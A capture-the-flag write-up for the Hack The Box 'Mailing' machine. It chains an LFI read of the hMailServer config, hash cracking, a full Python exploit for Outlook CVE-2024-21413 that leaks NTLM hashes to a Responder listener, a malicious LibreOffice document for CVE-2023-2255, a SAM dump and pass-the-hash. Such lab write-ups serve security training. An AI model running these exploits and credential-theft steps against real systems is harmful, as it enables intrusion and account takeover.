# Mailing Write-up

<img src="https://labs.hackthebox.com/storage/avatars/cedb2f991409f9f39b55b04513f6b102.png" width="200" height="200">

## Recon 

### Port enumeration with Nmap 

`nmap -sC -sV 10.10.11.14`

    PORT    STATE SERVICE       VERSION
    25/tcp  open  smtp          hMailServer smtpd
    | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    80/tcp  open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Did not follow redirect to http://mailing.htb
    110/tcp open  pop3          hMailServer pop3d
    |_pop3-capabilities: UIDL TOP USER
    135/tcp open  msrpc         Microsoft Windows RPC
    139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
    143/tcp open  imap          hMailServer imapd
    |_imap-capabilities: QUOTA SORT RIGHTS=texkA0001 IDLE IMAP4rev1 IMAP4 NAMESPACE completed CHILDREN CAPABILITY OK ACL
    445/tcp open  microsoft-ds?
    465/tcp open  ssl/smtp      hMailServer smtpd
    |_ssl-date: TLS randomness does not represent time
    | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
    | Not valid before: 2024-02-27T18:24:10
    |_Not valid after:  2029-10-06T18:24:10
    587/tcp open  smtp          hMailServer smtpd
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
    | Not valid before: 2024-02-27T18:24:10
    |_Not valid after:  2029-10-06T18:24:10
    | smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    993/tcp open  ssl/imap      hMailServer imapd
    |_ssl-date: TLS randomness does not represent time
    |_imap-capabilities: QUOTA SORT RIGHTS=texkA0001 IDLE IMAP4rev1 IMAP4 NAMESPACE completed CHILDREN CAPABILITY OK ACL
    | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
    | Not valid before: 2024-02-27T18:24:10
    |_Not valid after:  2029-10-06T18:24:10
    Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-time: 
    |   date: 2024-05-11T10:03:50
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    |_clock-skew: 1s

Add domain to /etc/hosts

    echo "10.10.11.14 mailing.htb" | sudo tee -a /etc/hosts

mailing.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/ada684d1-c652-4374-9417-6c11a8d7f80e)

### Directory Enumeration with Dirseacrh

`python3 dirsearch.py -e php,html,js -u http://mailing.htb/ --exclude-status 404,403,401,307`

      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    301 -  160B  - /assets  ->  http://mailing.htb/assets/           
    200 -  541B  - /assets/                                          
    200 -   31B  - /download.php                                     

Check `mailing.htb/download.php` 

![image](https://github.com/zer00d4y/writeups/assets/128820441/2123b098-0a7e-46d5-8851-f04a12e6b219)

Now, we can see that the site is vulnerable to LFI, when we add `?file=` parametr in address

![image](https://github.com/zer00d4y/writeups/assets/128820441/a1806eb2-28be-4a5e-8cc4-6a436e51c72d)

Using this payload:

mailing.htb/download.php?file=`../../../Program+Files+(x86)/hmailServer/Bin/hMailServer.INI`

Read the server configuration and find the hash of the admin password 

AdministratorPassword=`841bb5acfa6779ae432fd7a4e6600ba7`

![image](https://github.com/zer00d4y/writeups/assets/128820441/ee523b8b-0287-4a1a-a18c-117b4f3e8886)

## Brute force the hash with hashcat 

`hashcat -a 0 -m 0 hash rockyou.txt`

    841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 0 (MD5)
    Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7
    Time.Started.....: Sat May 11 06:42:56 2024 (4 secs)
    Time.Estimated...: Sat May 11 06:43:00 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/home/kali/wordlist/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  1631.0 kH/s (0.14ms) @ Accel:256 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 7563264/14344384 (52.73%)
    Rejected.........: 0/7563264 (0.00%)
    Restore.Point....: 7561728/14344384 (52.72%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: homershot -> home379/57
    Hardware.Mon.#1..: Util: 35%

## CVE-2024-21413

`CVE-2024-21413.py`

    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import argparse
    import sys
    
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    ENDC = "\033[0m"
    
    def display_banner():
        banner = f"""
    {BLUE}CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
    Alexander Hagenah / @xaitax / ah@primepage.de{ENDC}
    """
        print(banner)
    
    def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject):
    
        """Sends an email with both plain text and HTML parts, including advanced features."""
        msg = MIMEMultipart('alternative')
        msg['Subject'] = subject
        msg['From'] = sender_email
        msg['To'] = recipient_email
    
        text = "Please read this email in HTML format."
        base64_image_string = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANgAAAAuCAYAAABK69fpAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTMyIDc5LjE1OTI4NCwgMjAxNi8wNC8xOS0xMzoxMzo0MCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTAwQkM2Mzk4NDBBMTFFNjhDQkVCOTdDMjE1NkM3RkQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTAwQkM2Mzg4NDBBMTFFNjhDQkVCOTdDMjE1NkM3RkQiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUuNSAoV2luZG93cykiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpBMkM5MzFBNDcwQTExMUU2QUVERkExNDU3ODU1M0I3QiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBMkM5MzFBNTcwQTExMUU2QUVERkExNDU3ODU1M0I3QiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgQJy/MAAAxESURBVHja7FwNlFVVFT6PN8MMM8AIjPxomEyggCYgajIaguCkaC5AEocif9CIiLLyp9IMC9NgVRqrGpMSwcFSIs3URHERJoJCSlIgMQk0YCS/MjAww8zrbO/36rz99rnvzpt3Z6Z551trL5hz3z3n3HPO/t/3Rg6NL6lXIeCWXhfk0r99Ji05Hkb/IxojI8vK6lfbrk+fPl05OLQ2OrglcHBwDObg4BjMwcHBMZiDg2MwBwfHYA4ODr7IaW8PNOfliNryeKnqpM50u+vQXJRoGqlpmKZiTUc0HdT0hKa1Wclg+9/urWqqe6pOPf8vpjtYU39Nb4Mc2g6+oukWTSdZLL/sZLDDu4tU/ZE82+VZmko1NQgL9oymymYMPUTT7ZoaWXtU0wuafmm00QS/p+kLmvIhGedpmu3OdauDCiR+gLNiw7GsNRE75DSqSIeY7fJYTVdarp2u6TeajqY5NDFXueXaUcZgozV91fi7QNNdml7U9Cd3xlsVs1IwV1xAZieDpYCf5DlD0wWaVqTRbz9Nl/hcr2N/jxJ+E8H4jsFaD700fVFo365pIfwvcu7/xq53hWV0tqalmrZkK4OlkkrXpMlgE+EEB8V6S/tf3Ta0KiiYcSpre1fT5WxvOkAgfkLTJAjG09D+sslgLkyfiAlNZJQ4Y05t4j2/1/QQa7tf0x/cFrQqBoFxTDwpCD7ysztqukfTNE0DwUs13L93GiwRPTRN0fTjJtxThgBHU1CraYamRzSdrOmfmtZoirktaFU0Cm1vNMH0z3ofLAhI5T+ogkeKbhA2KYhlQJLuFbfcbZ7B6n32L2ZpdwwG7NB0GKZBHOdqGqqC5TnINLiIta1IEfDgdnwcMcsGSyhSXn6mGHtI972vaZem3QHHihkHpLumPvh/NZx5G05AMID+LcAB3K/pPU3/TmMPOmk6BX1SSuM4xv9XE/ujQENvzKsQ/dC89qCvVPvQgPE5cvFvlK1frkWQJvw+2xmMwucLNX3faKO81OSADEZBkW7G3xs1PRuAwegw/QSMorDBFJn6cgozcQhMy3OUV2XQjUnarZr+oulhTc8bG/5d3BMzJPUEHJA7NV2K/mJ4bko37GVjj0H7UAQCehjXDoExyZz6tabfBVg7YuqZCBQMZP1RXnAb5vINi9CI43xN12oarrxorulD12BemzUtUV4FBmfue5UXGazHGnDcrLwgVg5jsCjmzfv7oaZ9uB7Jdgaj518OM+90ZibehQ2yoQAba4LyaDsDjFuIyFS+0XYiGC1mOYxzNF3P7uGScxCIDtpKmLnERBTlupD9/sOafqqSUwbn4qDEQZryATBk1DJ2F2PscgQGvqbpHcvvidkpL/hRn7UdDJpvYbBiY006WvrpDCYgGg/rgnJcm4z9vwhCw4b4PIIgivVLUI/ZDNqYKhwIE30htfxwhUoM6RIzPi5EoWy2PmfeI5bfUtHXUmiu/IDPFROCKnys+5Scj6s17ieN+RIETjTg2BEw43ImtOIgbbHMh7lMHLOYzb2wJtN9mEvCGGj2YQHWPSPIdgaL4OBUCs7sZJ9DRe3Xsbb1MPMKMqxhf6a8yg8J+2CWvpXCjJI0xJU+QqcePs3DFiZR0E5kjm63XKcaywWGGRxftzkQYDwa9xLM6xWGeZonCCxqe0TwfePYjnnZtGdfCMJijFsYtomU7cjHAaV6wXFG+2iYBm8J9wwTDv2CEOY2zaJJKaw/D1piHzQOOffnKa9ANa8JwvN5+Ey1eN5SaI3bmKSP42n4GVW4pwD+z23wh0xcCC0zF3+XwFzlUbcvwWSsh6lbAu06Q2CwuN/GQRHZu5VXNH0EZu5H4GOOEZifinnvgKDsargGvEyK5v6MRRA9wMzHWqz/xv8yWPzrT2Hh3aVT0mbiiopFTb6nIT0tpiCtxzGHdaKFwa5h5to2I6iQKXTHAeDYAH9iG2vfgyAHMcDFKlhObTYOJT84A5Rcj0fpi88L7Tvg8y0TzM6bNP1c0wFNH1LJify16NcM1sTfLljErIhuYEaOF2Bx7BcE0ToEOD7Jrt2AQNObzN/iIG24yrJ+fDyKXK42+2x3JmLj3/Ue5qb1pbiVKvmVkc+o5MLOIjCYid8qL0ydSVwmmFLkt00VmEuxiN5TKnXRMh2a7wjtdZD4XVn7VkT0lM9hmyH4NKQtzjKEGWf8bsJYpkYwfdUyBGdMvAdm2W/powbz4vvTG9qam5+ShSMhT3AhItxFyFkwcn5DGAf9xlWzPhi8YuKSurQ7Wb7EfklFRknfRbxiQLWav+vEdEbbA0b5utHWDwf9Saa9TmaOeGUIS3ip0PaQRaOmgwU+Wk7ybxb6HOI4NkNQjWPtI8DQVNf3PvPLKPL4nPKitqnqQKWgDEVuq1PctxN7eBNrH4tgiQtyhGgimlikEstfSEhcbawTmU9T2D2vKnvxbrrIRbTNBDFDpmoV4/kuG3h+h3yyNQH7flVoiyfyqyzjlsLPIQYrhz8pYbBFEwfB60LbSWGfR1fsm4hNsOdNXG6YauT0f0xgykzjBJWYRI5r2OoM9d/oo41Iu3QRzMaDAfuWoopRo59vKa96RjK5Loa/RO/FfVYwvwqF5wgaPd0ltJ3iGKzlsUAl5l66woEmXMvs9G0qnAp4qWzqqErOZ4Wx95SczWnGWWmwPE8crykvT+b3ag5FJSkUP9dgziLBV2tUwcvLpJRLgWOwlgdJT/5C3VXKSypfleQKen5FphFRyeHpQhVyzgY4LvhmERW80r9TgN+QlUBpjtnKi/TZcKv6X9TwkEXzRZrxrNWOwVoeNYLjS5EwKisqZlL5FyHNoVbQBN1bwqRRXoHtQcF8C/qe3AChTSq2pagepQjoTfLPKS+cLoG+W9IT68EjlDkq+QVJG/oHNGcdg7UAHmXmGPlDl7H1WgVzJywmlzZ/Ugs8OwmOrUJ7WcDzJEU/1/ncQ5qJoqOUGpgnmHyUdD4N/98s3H9JwOcaK7S9FsLaxRyDpcY/lPfWsZ8ZsjjkOSwX2iiCWdoCwvNpoW1qAA1KTHiWwECvBJgThe+pGmSt8BwFhvnOQcUA56eY1wiBwSi9sroZa9QgCIMc7us5BrNLokofB3q7Cv/1/idUckEwmWqPQZsqi9P+aQRq8poxNvlIe1hbDwQeSnwO8YOCMHrU8FM/DvN7UAofkO9F3PeiMP47wprQ8w6z9EftVKWTKwiwjc30VQ8I/ucYznEO9kNGSd0hlms7Qx6ftCh9n+/brJ20yLNgNPrAShWk5lAwHh3iDSp4dE3CNuWVN32TtY/S9EeM/QYCFKdCg0xRyamFvczsy0OgiOZJCWIq8H0Tfh8l9amciadBdhhMRb+jOsj57DdngPkoxL8G8+8L5qJwfy/Bx71HNTttKqYIbgZf0ToNdAxmxxFosSGCRF3cQnOgV0rOVMnRS0I5qA5aI5cdoOaCXkQ8TzCtqJ7wVmONCnxMqFlM4zQamnYqiAIqlILoYumL8oxmDqsCQuRq9jti7pkgv3nR/t2hAn6ZNwWoOuR61kY5zDuxRnnORPTHYyo5okYSsqW+XUgH7zrllXDZ0FEwfzKR36mB9PcrYi7w8aemYf1MSLmoImgYqS8yw+cKphnVHv4qjXkdg4b5UYb25zkfRs1rlz5YLBbxS9h0FqSN3xqQGchfVahMYX5Jvk+h4LjzcqCuPgf9U8p7vSLI9+spqLBSJZZ8dREOepC9J9+JXiy9PeDYtfCxRsJf49inguUNyfSi98bGK/mt8sMwSamIN8i3JOuxJlSV4/fFsPyA+2n2e6NKrMhX7doH65jToKIRK4vRtykWMjNwb4pgB6n7pwyzJ1VBKkn8yaytSjhAk9jm7VX2ZC6Nez80Ah1ees+K6vK64x7SdFvge1HEbh07BMQgvdlz7Q+4pMehRYhhRiOYQS9h9oSgOYbno0O2WvnXLK5HH2fD9Ka3mvsY/WyEb0f+y6YAgagKBIOoxGo4668OPuKfsSarA/ily4Qgyusp7qE5U2piAnzUAUZgZkMkWnmg7VbT+8BWTd/wYgc1c/FYFcvv197N14hhcjWlZChTyDEOekMb6Ces/tId/4M9aXcmYjQaU+XnbM4G/zAG7XK8FZhLGWM3tJF+wuov3fEb26UPRss6vP9u5eDQFtD+GEzLjc6d69zOOjgGCw21bmMdHIM5ODgGc3BwcAzm4NAm8R8BBgAGrc+T79nGEQAAAABJRU5ErkJggg=="
    
        html = f"""\
        <html>
        <body>
            <img src="{base64_image_string}" alt="Image"><br />
            <h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
        </body>
        </html>
        """
    
        part1 = MIMEText(text, 'plain')
        part2 = MIMEText(html, 'html')
        msg.attach(part1)
        msg.attach(part2)
    
        try:
            with smtplib.SMTP(smtp_server, port) as server:
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(username, password)
                server.sendmail(sender_email, recipient_email, msg.as_string())
                print(f"{GREEN}✅ Email sent successfully.{ENDC}")
        except Exception as e:
            print(f"{RED}❌ Failed to send email: {e}{ENDC}")
    
    def main():
        display_banner()
        parser = argparse.ArgumentParser(description="PoC for CVE-2024-21413 with SMTP authentication.")
        parser.add_argument('--server', required=True, help="SMTP server hostname or IP")
        parser.add_argument('--port', type=int, default=587, help="SMTP server port")
        parser.add_argument('--username', required=True, help="SMTP server username for authentication")
        parser.add_argument('--password', required=True, help="SMTP server password for authentication")
        parser.add_argument('--sender', required=True, help="Sender email address")
        parser.add_argument('--recipient', required=True, help="Recipient email address")
        parser.add_argument('--url', required=True, help="Malicious path to include in the email")
        parser.add_argument('--subject', required=True, help="Email subject")
    
    
        args = parser.parse_args()
    
        send_email(args.server, args.port, args.username, args.password, args.sender, args.recipient, args.url, args.subject)
    
    if __name__ == "__main__":
        if len(sys.argv) == 1:
            display_banner()
            sys.exit(1)
        main()

### Responder 

    sudo responder -I tun0

![image](https://github.com/zer00d4y/writeups/assets/128820441/81e658e5-61bb-4dda-96ad-b1d990b02f4a)

    python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url YOUR-IP/RESPONDER-PORT --subject XD 

![image](https://github.com/zer00d4y/writeups/assets/128820441/89deca02-3717-4d7a-830e-492b81b60789)

![image](https://github.com/zer00d4y/writeups/assets/128820441/1ca85373-fe6e-4797-adc5-16674eda8437)

    maya::MAILING:dae5fb48f8a5d077:52DF681AF1852CCA5758E887AD02E241:01010000000000000043651058A4DA01E867C36B14BE93000000000002000800570036003300520001001E00570049004E002D0041003200390052004B0037004600560039005400360004003400570049004E002D0041003200390052004B003700460056003900540036002E0057003600330052002E004C004F00430041004C000300140057003600330052002E004C004F00430041004C000500140057003600330052002E004C004F00430041004C00070008000043651058A4DA010600040002000000080030003000000000000000000000000020000078C49ABCB348E76CD4843F8CBED47434F0C7686C93534770AC1EC19744709EAA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360038000000000000000000

### Brute Force with hashcat 

Brute Force the Maya's hash using hashcat 

`hashcat -a 0 -m 5600 hash rockyou.txt`

    MAYA::MAILING:dae5fb48f8a5d077:52df681af1852cca5758e887ad02e241:01010000000000000043651058a4da01e867c36b14be93000000000002000800570036003300520001001e00570049004e002d0041003200390052004b0037004600560039005400360004003400570049004e002d0041003200390052004b003700460056003900540036002e0057003600330052002e004c004f00430041004c000300140057003600330052002e004c004f00430041004c000500140057003600330052002e004c004f00430041004c00070008000043651058a4da010600040002000000080030003000000000000000000000000020000078c49abcb348e76cd4843f8cbed47434f0c7686c93534770ac1ec19744709eaa0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360038000000000000000000:m4y4ngs4ri
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 5600 (NetNTLMv2)
    Hash.Target......: MAYA::MAILING:dae5fb48f8a5d077:52df681af1852cca5758...000000
    Time.Started.....: Sun May 12 10:59:27 2024 (15 secs)
    Time.Estimated...: Sun May 12 10:59:42 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/home/kali/wordlist/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:   424.0 kH/s (1.68ms) @ Accel:256 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 5933568/14344384 (41.37%)
    Rejected.........: 0/5933568 (0.00%)
    Restore.Point....: 5932032/14344384 (41.35%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: m5151984 -> m431291
    Hardware.Mon.#1..: Util: 56%

## Evil winrm

Connecting to the host with evil-winrm, evil-winrm -i IP-ADDRESS -u USERNAME -p PASSWORD

    evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri

![image](https://github.com/zer00d4y/writeups/assets/128820441/539bbca7-d914-4b6b-83bf-cc9d5113b088)

## User flag

Get the user flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/7199439e-5380-4245-9523-915989ebf93f)

## Root flag

We see that the libreoffice application of this version has CVE-2023-2255 , Find an exploit that generates a file that will help us gain administrator privileges. Because of this vulnerability, the program automatically downloads malicious content when a user opens a document

![image](https://github.com/zer00d4y/writeups/assets/128820441/853294f4-36ad-4c63-ae63-91b4cd13350b)

### CVE-2023-2255

Exploit: https://github.com/elweth-sec/CVE-2023-2255

Download the exploit and use command to create `exploit.odt`

    python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'

![image](https://github.com/zer00d4y/writeups/assets/128820441/fbf933fd-6744-49b2-95f0-e08ac02659af)

Open python server to deliver the odt to the target host in the "C:\Important Documents\" folder

![image](https://github.com/zer00d4y/writeups/assets/128820441/6ae9a143-3494-4e4f-9f55-f26dfff0d82b)

Download exploit.odt using cURL on our target machine

![image](https://github.com/zer00d4y/writeups/assets/128820441/60cec23a-3aaa-4b28-956f-9e0519dc4555)

![image](https://github.com/zer00d4y/writeups/assets/128820441/4a3fdb09-1693-47c6-961b-204b6e3f9172)

Get the admin privileges

![image](https://github.com/zer00d4y/writeups/assets/128820441/a0edba82-5712-44fc-969d-eb6d2f553ed6)

### Crackmapexec 

crackmapexec smb 10.10.11.14 -u maya -p m4y4ngs4ri --sam

![image](https://github.com/zer00d4y/writeups/assets/128820441/4c1a7017-745d-4a4c-8305-30f11589f2fb)

    Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
    localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
    maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::

Auth using localadmin hash

    impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"

![image](https://github.com/zer00d4y/writeups/assets/128820441/4033115f-c2a2-4103-8b2a-c14aa75c741b)

Get the root flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/6daf904c-32ed-4991-b1b0-df5c3f97cb08)



